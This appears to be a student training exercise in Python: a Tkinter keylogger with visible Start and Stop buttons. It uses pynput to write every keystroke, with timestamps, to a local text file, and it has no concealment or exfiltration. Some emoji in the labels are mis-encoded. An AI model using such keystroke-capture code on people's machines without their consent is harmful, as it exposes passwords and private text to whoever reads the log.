import tkinter as tk
from pynput import keyboard
import threading
from datetime import datetime

log_file = "keystrokes_log.txt"
listener = None
is_logging = False

def log_keystroke(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(f"{datetime.now()} - {key.char}\n")
            else:
                if key == keyboard.Key.space:
                    f.write(f"{datetime.now()} - [SPACE]\n")
                elif key == keyboard.Key.enter:
                    f.write(f"{datetime.now()} - [ENTER]\n")
                elif key == keyboard.Key.backspace:
                    f.write(f"{datetime.now()} - [BACKSPACE]\n")
                else:
                    f.write(f"{datetime.now()} - [{key.name.upper()}]\n")
    except Exception as e:
        print(f"Error: {e}")

def on_press(key):
    if is_logging:
        log_keystroke(key)

def on_release(key):
    if key == keyboard.Key.esc:
        stop_logging()
        return False

def start_logging():
    global listener, is_logging
    if not is_logging:
        is_logging = True
        status_label.config(text="üî¥ Logging in progress...")
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        threading.Thread(target=listener.start).start()

def stop_logging():
    global listener, is_logging
    is_logging = False
    status_label.config(text="üü¢ Logging stopped.")
    if listener is not None:
        listener.stop()

# --- GUI Setup ---
root = tk.Tk()
root.title("SkillCraft Keylogger")
root.geometry("350x180")
root.resizable(False, False)

title_label = tk.Label(root, text="üîê Keylogger - SkillCraft Task 04", font=("Arial", 14, "bold"))
title_label.pack(pady=10)

start_btn = tk.Button(root, text="‚ñ∂ Start Logging", width=20, bg="green", fg="white", command=start_logging)
start_btn.pack(pady=5)

stop_btn = tk.Button(root, text="‚èπ Stop Logging", width=20, bg="red", fg="white", command=stop_logging)
stop_btn.pack(pady=5)

status_label = tk.Label(root, text="üü¢ Logging not started.", font=("Arial", 10))
status_label.pack(pady=10)

root.mainloop()
